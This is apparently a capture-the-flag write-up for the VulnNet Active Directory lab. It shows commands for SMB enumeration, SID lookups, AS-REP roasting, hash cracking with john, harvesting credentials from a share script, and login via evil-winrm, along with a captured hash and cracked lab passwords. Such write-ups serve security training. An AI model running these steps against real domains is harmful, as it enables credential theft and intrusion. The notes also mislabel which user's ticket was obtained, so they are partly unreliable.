We can connect to the `VulnNet-Business-Anonymous` and `VulnNet-Enterprise-Anonymous`  shares

`smbclient \\\\10.10.189.145\\share_name`

We grab 6 txt files and can enum user names? from them
```
Johnny Leet
Tony Skid
Jack Goldenhand
Alexa Whitehat
```

---

we can use impacket's `lookupsid.py` to enumerate users
`python3 lookupsid.py guest@10.10.127.164`

This gives us a list of user names
```
1000: VULNNET-RST\WIN-2BO8M1OE1M1$ (SidTypeUser)
1101: VULNNET-RST\DnsAdmins (SidTypeAlias)
1102: VULNNET-RST\DnsUpdateProxy (SidTypeGroup)
1104: VULNNET-RST\enterprise-core-vn (SidTypeUser)
1105: VULNNET-RST\a-whitehat (SidTypeUser)
1109: VULNNET-RST\t-skid (SidTypeUser)
1110: VULNNET-RST\j-goldenhand (SidTypeUser)
1111: VULNNET-RST\j-leet (SidTypeUser)
```

---

### checking for asrep roasting

Now that we have user names, we throw them into a users.txt file and check to see if they are vulnerable to asrep roasting

`python3 /tmp/impacket/examples/GetNPUsers.py vulnnet-rst.local/ -usersfile users.txt -dc-ip 10.10.127.164 -request -no-pass`

This returns a TGT ticket for a-whitehat
`$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:667424d94b7a72983e3e793ec301e7e3$be00d5d0cb8f633d9ee19f00d7dd51cc94e891b27f1da985d0a683fee25617c465327be3ee865cbed48857903b23a0ac1e3ee2c2c2cca5e89f8995baf11bf2cbf0ddf37306261e20e7b75695945f4ae5fde75613473be2dd5085dc981c4643be869eea513fc622821d682ac0ce92d5ab7c89284a1886ba9378429ea71d7481ccd13c3271762ada8fc23111e0810225d3d0bf542ddf796825c5d7d795540c553911bd783b9d5a17a954c7511168753b329ab9d60a75bdc4a549091843c84025ee7633116ed7387f0a32fe9f0257bd5e41e667dd342ebc8af377273b83f40d71b02b7f0f75e0ea3b8e0a26599e35bb8940dbf1b7dd3a26`

We can then crack this by throwing it into `crack.txt` and running john
`john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt`

This gives us the password `tj072889*`

---

now that we have creds, we can try to access SYSLOG and NETLOGON smb shares with t-skid's creds

`smbclient \\\\10.10.127.164\\SYSLOG -U t-skid`

This gives us a bunch of files, namely `resetpassword.vbs`
which contain's a-whitehat's creds

`a-whitehat:bNdKVkjv3RR9ht`

We can user `evil-winrm` with a-whitehat's creds to grab the user.txt in `c:\users\enterprise-core-vn\desktop`

